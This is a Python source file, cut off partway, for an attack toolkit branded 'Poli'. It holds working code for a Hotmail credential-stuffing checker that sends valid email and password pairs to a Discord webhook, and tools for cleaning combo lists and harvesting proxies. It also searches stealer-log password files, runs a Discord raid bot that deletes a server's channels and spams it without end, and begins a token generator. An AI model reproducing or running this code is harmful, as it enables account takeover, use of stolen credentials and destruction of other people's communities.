import os
import time
import logging
import tkinter as tk
from tkinter import filedialog
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import json
import base64
import hashlib
import datetime
import random
import string
import os
import sys
import time
import logging
import threading
import ctypes
import re
from urllib.parse import urlparse
import discord
from discord.ext import commands
import asyncio
from pystyle import Colors, Colorate, Center
import pickle

try:
    from usersearch import run_search
    usersearch_available = True
except ImportError:
    usersearch_available = False

try:
    from tokenchecker import check_tokens_from_file
    tokenchecker_available = True
except ImportError:
    tokenchecker_available = False

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
    crypto_available = True
except ImportError:
    crypto_available = False

try:
    import wmi
    wmi_available = True
except ImportError:
    wmi_available = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from webdriver_manager.chrome import ChromeDriverManager
    selenium_available = True
except ImportError:
    selenium_available = False

logging.getLogger('selenium').setLevel(logging.CRITICAL)
logging.getLogger('webdriver').setLevel(logging.CRITICAL)
logging.getLogger('').setLevel(logging.CRITICAL)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_ascii_art():
    return """
    ██████╗  ██████╗ ██╗     ██╗
    ██╔══██╗██╔═══██╗██║     ██║
    ██████╔╝██║   ██║██║     ██║
    ██╔═══╝ ██║   ██║██║     ██║
    ██║     ╚██████╔╝███████╗██║
    ╚═╝      ╚═════╝ ╚══════╝╚═╝
    """.split('\n')

def print_ascii_art():
    art_lines = get_ascii_art()
    for line in art_lines:
        print(Colorate.Horizontal(Colors.blue_to_cyan, line))
    print()

def gradient_print(text, color=Colors.blue_to_cyan):
    print(Colorate.Horizontal(Colors.blue_to_cyan, text))

original_print = print

def contains_ansi_codes(text):
    return '\033[' in text or '\x1b[' in text or '[38;2;' in text

def apply_theme_colors(text):
    if contains_ansi_codes(text):
        return text
    return Colorate.Horizontal(Colors.blue_to_cyan, text)

def colored_input(prompt_text, gradient_type='secondary_gradient'):
    original_print(Colorate.Horizontal(Colors.blue_to_cyan, prompt_text), end='')
    return input()

def print_help_menu(mode="dev"):
    print(Colorate.Horizontal(Colors.blue_to_cyan, "\n" + "="*50))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("AVAILABLE COMMANDS")))
    print(Colorate.Horizontal(Colors.blue_to_cyan, "="*50))
    print()
    
    if mode == "dev":
        commands = [
            ("hotmail", "Check Hotmail accounts"),
            ("harvest", "Harvest proxy lists"),
            ("proxycheck", "Check proxy validity"),
            ("rarsearcher", "Find RAR Logs"),
            ("txtsearcher", "Search text files for keywords"),
            ("combocleaner", "Clean and optimize combo lists"),
            ("usersearch", "Search usernames across platforms"),
            ("raid", "Execute Discord raid operations"),
            ("tokengen", "Generate Discord tokens"),
            ("tokenchecker", "Check Discord tokens"),
            ("help", "Show this help menu"),
            ("clear", "Clear the screen"),
            ("exit", "Exit the application")
        ]
        print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("DEVELOPER MODE - ALL FEATURES AVAILABLE")))
    else:
        commands = [
            ("rarsearcher", "Find RAR Logs"),
            ("txtsearcher", "Search text files for keywords"),
            ("combocleaner", "Clean and optimize combo lists"),
            ("usersearch", "Search usernames across platforms"),
            ("raid", "Execute Discord raid operations"),
            ("tokengen", "Generate Discord tokens"),
            ("tokenchecker", "Check Discord tokens"),
            ("help", "Show this help menu"),
            ("clear", "Clear the screen"),
            ("exit", "Exit the application")
        ]
        print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("USER MODE - BASIC FEATURES ONLY")))
    
    print(Colorate.Horizontal(Colors.blue_to_cyan, "COMMAND" + " " * 20 + "DESCRIPTION"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, "=" * 50))
    
    for cmd, desc in commands:
        print(f"  {Colorate.Horizontal(Colors.blue_to_cyan, cmd)} {' ' * (20 - len(cmd))} {Colorate.Horizontal(Colors.blue_to_cyan, desc)}")
    
    print(Colorate.Horizontal(Colors.blue_to_cyan, "="*50))
    print()

def print_footer():
    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    current_date = datetime.datetime.now().strftime("%d-%m-%Y")
    
    print(Colorate.Horizontal(Colors.blue_to_cyan, ""))
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"Time: {current_time} | Date: {current_date}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, ""))
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Created with by Poli Team"))
    print()

def choose_file(title="Select File", filetypes=None):
    root = tk.Tk()
    root.withdraw()  
    root.attributes('-topmost', True)
    
    if filetypes is None:
        filetypes = [('All Files', '*.*')]
        
    file_path = filedialog.askopenfilename(title=title, filetypes=filetypes)
    root.destroy()
    return file_path

def choose_directory(title="Select Directory"):
    root = tk.Tk()
    root.withdraw()  
    root.attributes('-topmost', True) 
    directory = filedialog.askdirectory(title=title)
    root.destroy()
    return directory

class AESCipher:
    def __init__(self, key):
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw_bytes = raw.encode()
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(raw_bytes, AES.block_size))
        return base64.b64encode(iv + encrypted)

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc[AES.block_size:])
        return unpad(decrypted, AES.block_size).decode('utf-8')

def hotmail_checker():
    clear_console()
    print_ascii_art()
    gradient_print(Center.XCenter("="*50))
    gradient_print(Center.XCenter("HOTMAIL CHECKER"))
    gradient_print(Center.XCenter("="*50))
    
    if not selenium_available:
        gradient_print(Center.XCenter("Selenium not installed. Please install it to use this tool."))
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return
    
    use_discord_webhook = colored_input("\nDo you want to send hits to a Discord webhook? (yes/no): ").lower() == 'yes'
    webhook_url = None

    if use_discord_webhook:
        webhook_url = colored_input("┌─[beta@poli]\n└──╼ Enter Discord webhook URL: ").strip()
        gradient_print("Discord webhook configured. Hits will be sent to Discord.")

    file_path = choose_file("Select combo list (email:password)")
    if not file_path or not os.path.exists(file_path):
        gradient_print("No file selected or file doesn't exist.")
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return

    combos = []
    with open(file_path, 'r', encoding='utf-8') as file:
        for line in file:
            if ':' in line:
                email, password = line.strip().split(':', 1)
                combos.append((email, password))

    if not combos:
        gradient_print("No valid combos found in the file.")
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return

    num_instances = 0
    while True:
        try:
            num_instances = int(colored_input("\n┌─[beta@poli]\n└──╼ How many parallel browsers to use? (1-5): "))
            if 1 <= num_instances <= 5:
                break
            gradient_print("Please enter a number between 1 and 5.")
        except ValueError:
            gradient_print("Please enter a valid number.")

    combo_queue = Queue()
    for combo in combos:
        combo_queue.put(combo)

    def send_to_discord(email, password):
        if not use_discord_webhook or not webhook_url:
            return
        
        embed = {
            "title": "✅ New Hotmail Hit Detected! ✅",
            "color": 5814783,
            "fields": [
                {
                    "name": "📧 Email",
                    "value": f"{email}",
                    "inline": True
                },
                {
                    "name": "🔑 Password",
                    "value": f"{password}",
                    "inline": True
                }
            ],
            "footer": {
                "text": "Hotmail Checker Tool"
            },
            "timestamp": datetime.datetime.utcnow().isoformat()
        }
        
        payload = {
            "content": "🔥 **NEW HOTMAIL HIT!** 🔥",
            "embeds": [embed]
        }
        
        try:
            response = requests.post(
                webhook_url,
                data=json.dumps(payload),
                headers={"Content-Type": "application/json"}
            )
            if response.status_code == 204:
                gradient_print("Hit sent to Discord webhook!")
        except Exception as e:
            gradient_print(f"Failed to send to Discord: {str(e)}")

    def save_hit(email, password):
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(f"{email}:{password}\n")
        
        if use_discord_webhook:
            send_to_discord(email, password)

    def test_hotmail_login(email, password, driver):
        try:
            driver.get("https://login.live.com")
            WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.NAME, "loginfmt")))

            driver.find_element(By.NAME, "loginfmt").send_keys(email)
            driver.find_element(By.ID, "idSIButton9").click()

            WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.NAME, "passwd")))
            driver.find_element(By.NAME, "passwd").send_keys(password)
            driver.find_element(By.ID, "idSIButton9").click()
            time.sleep(0.5)

            try:
                WebDriverWait(driver, 4).until(
                    EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Stay signed in?')]"))
                )
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"[SUCCESS] {email}:{password}"))
                save_hit(email, password)
                return True
            except:
                if "Stay signed in?" in driver.page_source:
                    print(Colorate.Horizontal(Colors.blue_to_cyan, f"[SUCCESS] {email}:{password}"))
                    save_hit(email, password)
                    return True

            current_url = driver.current_url
            if "login.live.com" not in current_url and ("outlook.live.com" in current_url or "account.microsoft.com" in current_url):
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"[SUCCESS] {email}:{password}"))
                save_hit(email, password)
                return True

            print(Colorate.Horizontal(Colors.blue_to_cyan, f"[FAILED] {email}:{password}"))
            return False

        except:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"[FAILED] {email}:{password}"))
            return False

    def worker(combo_queue, instance_id, max_instances, executor):
        while not combo_queue.empty():
            options = webdriver.ChromeOptions()
            options.add_argument("--headless")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-gpu")
            options.add_argument("--log-level=3")
            options.add_argument("--disable-dev-shm-usage")
            options.add_experimental_option("excludeSwitches", ["enable-logging"])

            driver = webdriver.Chrome(
                service=Service(ChromeDriverManager().install(), log_output=os.devnull),
                options=options
            )

            try:
                email, password = combo_queue.get()
                success = test_hotmail_login(email, password, driver)
                combo_queue.task_done()

                if success:
                    driver.quit()
                    if not combo_queue.empty():
                        executor.submit(worker, combo_queue, instance_id, max_instances, executor)
                    return

                time.sleep(2)
            except:
                combo_queue.task_done()
            finally:
                driver.quit()

    with ThreadPoolExecutor(max_workers=num_instances) as executor:
        for i in range(num_instances):
            executor.submit(worker, combo_queue, i+1, num_instances, executor)
            time.sleep(0.2)

    gradient_print("All combinations have been checked.")
    colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")

def combo_tools():
    clear_console()
    print_ascii_art()
    gradient_print(Center.XCenter("="*50))
    gradient_print(Center.XCenter("COMBO TOOLS"))
    gradient_print(Center.XCenter("="*50))
    
    gradient_print(Center.XCenter("\nUse 'combocleaner' for Combo Cleaner"))
    gradient_print(Center.XCenter("Use 'txtsearcher' for Text File Keyword Searcher"))
    
    colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
    return

def combocleaner():
    clear_console()
    print_ascii_art()
    gradient_print(Center.XCenter("="*50))
    gradient_print(Center.XCenter("COMBO CLEANER & OPTIMIZER"))
    gradient_print(Center.XCenter("="*50))
    
    file_path = choose_file("Select combo file to process")
    if not file_path:
        gradient_print("No file selected.")
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return
        
    gradient_print("Starting automatic combo processing...")
    current_file = file_path
    
    gradient_print("Step 1: Running Duplicate Deleter...")
    output_file = f"{os.path.splitext(current_file)[0]}_no_duplicates.txt"
    
    with open(current_file, "r", encoding="utf-8", errors="ignore") as file:
        lines = file.readlines()
    
    seen = set()
    def process_line(line):
        line = line.strip()
        if line and line not in seen:
            seen.add(line)
            return line + "\n"
        return None
    
    with ThreadPoolExecutor() as executor:
        unique_lines = list(filter(None, executor.map(process_line, lines)))
    
    with open(output_file, "w", encoding="utf-8") as file:
        file.writelines(unique_lines)
    
    current_file = output_file
    gradient_print(f"Duplicate deleter completed. Output: {current_file}")
    
    gradient_print("Step 2: Running Reverse Line Fixer...")
    with open(current_file, "r", encoding="utf-8") as file:
        lines = file.readlines()
    
    def reverse_line(line):
        reversed_line = re.sub(r'([^:]+):([^:]+):(https?://\S+)', r'\3:\2:\1', line).strip()
        return reversed_line + "\n" if reversed_line else line
    
    with ThreadPoolExecutor() as executor:
        reversed_lines = list(executor.map(reverse_line, lines))
    
    output_file = f"{os.path.splitext(current_file)[0]}_reversed.txt"
    with open(output_file, "w", encoding="utf-8") as file:
        file.writelines(reversed_lines)
    
    current_file = output_file
    gradient_print(f"Reverse line fixer completed. Output: {current_file}")
    
    gradient_print("Step 3: Running Combo Optimizer...")
    with open(current_file, "r", encoding="utf-8") as file:
        lines = file.readlines()
    
    def clean_line(line):
        cleaned_line = re.sub(r'https?://\S+?:', '', line).strip()
        return cleaned_line + "\n" if cleaned_line.strip() else None
    
    with ThreadPoolExecutor() as executor:
        cleaned_lines = list(filter(None, executor.map(clean_line, lines)))
    
    output_file = f"{os.path.splitext(current_file)[0]}_cleaned.txt"
    with open(output_file, "w", encoding="utf-8") as file:
        file.writelines(cleaned_lines)
    
    current_file = output_file
    gradient_print(f"Combo optimizer completed. Output: {current_file}")
    gradient_print("All processes completed!")
    
    colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        
def txtsearcher():
    clear_console()
    print_ascii_art()
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("="*50)))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("TEXT FILE KEYWORD SEARCHER")))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("="*50)))
    
    directory = choose_directory("Select directory with text files")
    if not directory:
        print(Colorate.Horizontal(Colors.blue_to_cyan, "No directory selected."))
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return
        
    search_terms = colored_input("\n┌─[beta@poli]\n└──╼ Enter search terms (comma-separated): ").strip().split(',')
    if not search_terms:
        print(Colorate.Horizontal(Colors.blue_to_cyan, "No search terms provided."))
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return
        
    files = [os.path.join(directory, f) for f in os.listdir(directory) if f.endswith('.txt')]
    if not files:
        print(Colorate.Horizontal(Colors.blue_to_cyan, "No .txt files found in the selected directory."))
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return
        
    for term in search_terms:
        term = term.strip()
        if not term:
            continue
            
        output_name = re.sub(r'[<>:"/\\|?*]', '_', f"{term}_results.txt")
        counter = 1
        while os.path.exists(output_name):
            output_name = f"{term}_results_{counter}.txt"
            counter += 1
            
        with open(output_name, "w", encoding="utf-8") as output:
            for file in files:
                try:
                    with open(file, "r", encoding="utf-8", errors="ignore") as f:
                        matches = [line for line in f if term in line]
                        if matches:
                            output.writelines(matches)
                except Exception as e:
                    print(Colorate.Horizontal(Colors.blue_to_cyan, f"Error processing {file}: {e}"))
                    
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"Results for '{term}' saved to: {output_name}"))
    
    colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")

def proxy_harvester():
    clear_console()
    print_ascii_art()
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("="*50)))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("PROXY HARVESTER")))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("="*50)))
    
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Starting proxy harvesting operation..."))
    
    proxy_sites = [
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
        "https://openproxy.space/list/http",
        "https://proxylist.geonode.com/api/proxy-list?limit=500",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt"
    ]
    
    proxy_regex = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$')
    
    def is_valid_proxy(proxy):
        return bool(proxy_regex.match(proxy.strip()))
    
    def fetch_proxies(url):
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies = []
                if url.endswith('.json') or 'proxylist.geonode.com' in url:
                    try:
                        data = json.loads(response.text)
                        if 'proxylist.geonode.com' in url:
                            proxies = [f"{item['ip']}:{item['port']}" for item in data['data']]
                        else:
                            proxies = [f"{item['ip']}:{item['port']}" for item in data]
                    except:
                        return []
                else:
                    proxies = response.text.splitlines()
                
                return {proxy for proxy in proxies if is_valid_proxy(proxy)}
        except:
            pass
        return set()
    
    def save_proxies_to_file(proxies, filename="harvested_proxies.txt"):
        with open(filename, "w", encoding="utf-8") as file:
            for proxy in proxies:
                file.write(f"{proxy}\n")
    
    all_proxies = set()
    
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Fetching proxy lists..."))
    with ThreadPoolExecutor(max_workers=20) as executor:
        future_to_url = {executor.submit(fetch_proxies, url): url for url in proxy_sites}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                proxies = future.result()
                all_proxies.update(proxies)
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"Fetched {len(proxies)} proxies from {urlparse(url).netloc}"))
            except:
                pass
    
    all_proxies = sorted(list(all_proxies))
    save_proxies_to_file(all_proxies)
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"Total unique proxies harvested: {len(all_proxies)}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Proxies saved to harvested_proxies.txt"))
    
    colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")

def proxy_checker():
    clear_console()
    print_ascii_art()
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("="*50)))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("PROXY CHECKER")))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("="*50)))
    
    file_path = choose_file("Select proxy list file")
    if not file_path or not os.path.exists(file_path):
        print(Colorate.Horizontal(Colors.blue_to_cyan, "No file selected or file doesn't exist."))
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return

    proxies = set()
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            line = line.strip()
            if line and re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$', line):
                proxies.add(line)
    
    if not proxies:
        print(Colorate.Horizontal(Colors.blue_to_cyan, "No valid proxies found in the file."))
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return
    
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"Found {len(proxies)} proxies to check."))
    
    def test_proxy(proxy):
        try:
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
            if response.status_code == 200:
                return proxy
        except:
            pass
        return None
    
    def save_proxies_to_file(proxies, filename="working_proxies.txt"):
        with open(filename, "w", encoding="utf-8") as file:
            for proxy in proxies:
                file.write(f"{proxy}\n")
    
    working_proxies = set()
    max_workers = min(100, len(proxies))
    
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Testing proxies..."))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_proxy = {executor.submit(test_proxy, proxy): proxy for proxy in proxies}
        completed = 0
        total = len(future_to_proxy)
        
        for future in as_completed(future_to_proxy):
            completed += 1
            if completed % 50 == 0 or completed == total:
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"Testing progress: {completed}/{total}"))
                
            result = future.result()
            if result:
                working_proxies.add(result)
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"Working proxy found: {result}"))
    
    working_proxies = sorted(list(working_proxies))
    save_proxies_to_file(working_proxies)
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"Total working proxies: {len(working_proxies)}"))
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Working proxies saved to working_proxies.txt"))
    
    colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")

def rarsearcher():
    clear_console()
    print_ascii_art()
    gradient_print(Center.XCenter("="*50))
    gradient_print(Center.XCenter("RAR PASSWORD FINDER"))
    gradient_print(Center.XCenter("="*50))
    
    keyword = colored_input("\n┌─[beta@poli]\n└──╼ Enter keyword to search for: ").strip()
    if not keyword:
        gradient_print("No keyword entered.")
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return
    
    base_folder = choose_directory("Select the folder to search in")
    if not base_folder:
        gradient_print("No folder selected.")
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return
    
    def is_valid_block(lines):
        if len(lines) != 4:
            return False
        required = ["URL", "Username", "Password", "Application"]
        for line, req in zip(lines, required):
            if not line.strip().lower().startswith(req.lower() + ":"):
                return False
        return True
    
    def clean_line(line):
        parts = line.strip().split(":", 1)
        return parts[1].strip() if len(parts) == 2 else ""
    
    matches = []
    
    gradient_print(f"Searching for keyword '{keyword}' in {base_folder}...")
    for root, dirs, files in os.walk(base_folder):
        for file in files:
            if file.lower() in ["passwords.txt", "all passwords.txt"]:
                full_path = os.path.join(root, file)
                try:
                    with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                    
                    for i in range(0, len(lines) - 3):
                        block = [lines[i], lines[i+1], lines[i+2], lines[i+3]]
                        if is_valid_block(block):
                            url = clean_line(block[0])
                            username = clean_line(block[1])
                            password = clean_line(block[2])
                            application = clean_line(block[3])

                            if keyword.lower() in (url + username + application).lower():
                                matches.append(f"{url}:{username}:{password}")
                except Exception as e:
                    gradient_print(f"Error reading {full_path}: {e}")

    if matches:
        output_file = "results.txt"
        with open(output_file, 'w', encoding='utf-8') as f:
            for line in matches:
                f.write(line + "\n")
        gradient_print(f"Found {len(matches)} matches. Results saved to {output_file}")
    else:
        gradient_print("No matches found.")
    
    colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")

def username_search_tool():
    clear_console()
    print_ascii_art()
    gradient_print(Center.XCenter("="*50))
    gradient_print(Center.XCenter("USERNAME SEARCH TOOL"))
    gradient_print(Center.XCenter("="*50))
    
    if not usersearch_available:
        gradient_print(Center.XCenter("Username search module not available."))
        gradient_print(Center.XCenter("Make sure usersearch.py is in the same directory."))
        colored_input("\n┌─[poli@security]\n└──╼ Press Enter to return to the main menu... ")
        return
    
    username = colored_input("\n┌─[poli@security]\n└──╼ Enter username to search: ")
    if not username:
        gradient_print("No username provided.")
        colored_input("\n┌─[poli@security]\n└──╼ Press Enter to return to the main menu... ")
        return
    
    gradient_print(f"\nSearching for username '{username}' across multiple platforms...")
    gradient_print("This may take a few minutes. Please be patient.")
    
    
    def update_progress(current, total):
        progress = int(current / total * 100)
        bar_width = 50
        filled_width = int(bar_width * current / total)
        bar = '█' * filled_width + ' ' * (bar_width - filled_width)
        sys.stdout.write(f"\r[{Colorate.Horizontal(Colors.purple, bar)}] {progress}% ({current}/{total} platforms checked)")
        sys.stdout.flush()
    
    try:
        result_file = run_search(username, update_progress)
        print()  
        gradient_print(f"\nSearch completed successfully!")
        gradient_print(f"Results saved to: {result_file}")
        
        
        try:
            if os.name == 'nt':  
                os.system(f'start {result_file}')
            elif os.name == 'posix':  
                if sys.platform == 'darwin':  
                    os.system(f'open {result_file}')
                else:  
                    os.system(f'xdg-open {result_file}')
            gradient_print("Results file opened in your default browser.")
        except Exception as e:
            gradient_print(f"Could not open results file automatically: {str(e)}")
            gradient_print(f"Please open the file manually from: {result_file}")
    
    except Exception as e:
        gradient_print(f"\nAn error occurred during the search: {str(e)}")
    
    colored_input("\n┌─[poli@security]\n└──╼ Press Enter to return to the main menu... ")

def discord_raid_tool():
    clear_console()
    print_ascii_art()
    gradient_print(Center.XCenter("="*50))
    gradient_print(Center.XCenter("DISCORD RAID TOOL"))
    gradient_print(Center.XCenter("="*50))
    
    token = colored_input("\n┌─[beta@poli]\n└──╼ Enter bot token: ")
    if not token:
        gradient_print("No token provided.")
        colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
        return
    
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)
    
    @bot.event
    async def on_ready():
        gradient_print(f"Bot is active: {bot.user}")
        gradient_print("Available commands:")
        gradient_print("!raid - Delete all channels and create new ones")
        gradient_print("!spam - Start spamming @everyone in all channels")
        gradient_print("!nuke - Complete server destruction (delete + spam)")
    
    @bot.command()
    async def raid(ctx):
        try:
            await ctx.send("♻️ Starting raid operation...")
            
            guild = ctx.guild
            
            gradient_print("Deleting all channels...")
            channels_to_delete = list(guild.channels)
            for channel in channels_to_delete:
                try:
                    await channel.delete()
                    await asyncio.sleep(0.1)  
                except Exception as e:
                    gradient_print(f"Error deleting channel: {str(e)}")
            
            await asyncio.sleep(1)
            
            gradient_print("Creating channels until Discord's limit is reached...")
            
            try:
                main_category = await guild.create_category("RAIDED BY POLI")
                await asyncio.sleep(0.5)
                
                announcement = await guild.create_text_channel("announcements", category=main_category)
                await asyncio.sleep(0.3)
                await announcement.send("@everyone **SERVER RAIDED BY POLI SECURITY TOOLKIT**")
                
                channel_count = 1  
                category_count = 1  
                
                max_categories = 50
                max_channels = 500
                channels_per_category = 10
                
                while category_count < max_categories and channel_count < max_channels:
                    try:
                        category = await guild.create_category(f"RAIDED-{category_count}")
                        category_count += 1
                        await asyncio.sleep(0.2)
                        
                        for j in range(channels_per_category):
                            if channel_count >= max_channels:
                                break
                                
                            try:
                                channel = await guild.create_text_channel(f"raided-{category_count}-{j}", category=category)
                                channel_count += 1
                                await asyncio.sleep(0.1)
                                
                                try:
                                    await channel.send("@everyone **CHANNEL CREATED BY POLI RAID TOOL**")
                                except:
                                    pass  
                            except discord.errors.HTTPException as e:
                                if e.status == 429:  
                                    gradient_print("Rate limited by Discord. Waiting...")
                                    await asyncio.sleep(5)  
                                elif e.status == 403:  
                                    gradient_print("Permission denied. Channel limit might be reached.")
                                    break
                                else:
                                    gradient_print(f"HTTP error creating channel: {e}")
                                    await asyncio.sleep(1)
                            except Exception as e:
                                gradient_print(f"Error creating channel: {str(e)}")
                                await asyncio.sleep(1)
                    except Exception as e:
                        gradient_print(f"Error creating category: {str(e)}")
                        await asyncio.sleep(1)
                
                gradient_print(f"Raid completed! Created {channel_count} channels in {category_count} categories.")
            except Exception as e:
                gradient_print(f"Error during channel creation: {str(e)}")
        except Exception as e:
            gradient_print(f"Error in raid command: {str(e)}")
    
    @bot.command()
    async def nuke(ctx):
        try:
            
            await raid(ctx)
            
            await spam(ctx)
        except Exception as e:
            gradient_print(f"Error in nuke command: {str(e)}")
    
    @bot.command()
    async def spam(ctx):
        try:
            await ctx.send("🔴 Spam started! Close the bot to stop.")
            
           
            spam_messages = [
                "@everyone **SERVER RAIDED**",
                "@everyone **HACKED BY POLI SECURITY TOOLKIT**",
                "@everyone **YOUR SERVER IS COMPROMISED**",
                "@everyone **SECURITY BREACH DETECTED**",
                "@everyone **POLI WAS HERE**"
            ]
            
            while True:
                for channel in ctx.guild.text_channels:
                    try:
                        message = random.choice(spam_messages)
                        await channel.send(message)
                        await asyncio.sleep(0.5)  
                    except:
                        continue
        except Exception as e:
            gradient_print(f"Error in spam command: {str(e)}")
    
    
    gradient_print("\nStarting Discord bot with the following commands:")
    gradient_print("  !raid - Delete all channels and create new ones")
    gradient_print("  !spam - Start spamming in all channels")
    gradient_print("  !nuke - Complete server destruction (delete + spam)")
    gradient_print("\nPress Ctrl+C in this console to stop the bot and return to the main menu.")
    
    
    try:
        bot.run(token)
    except Exception as e:
        gradient_print(f"Error running bot: {str(e)}")
        gradient_print("Possible causes:")
        gradient_print("- Invalid bot token")
        gradient_print("- Network connectivity issues")
        gradient_print("- Discord API changes or rate limiting")
    
    colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")

def discord_token_generator():
    clear_console()
    print_ascii_art()
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("="*50)))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("DISCORD TOKEN GENERATOR")))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter("="*50)))
    
    try:
        num_tokens = int(colored_input("\n┌─[beta@poli]\n└──╼ How many tokens to generate? "))
        if num_tokens <= 0:
            print(Colorate.Horizontal(Colors.blue_to_cyan, "Number must be greater than 0"))
            colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")
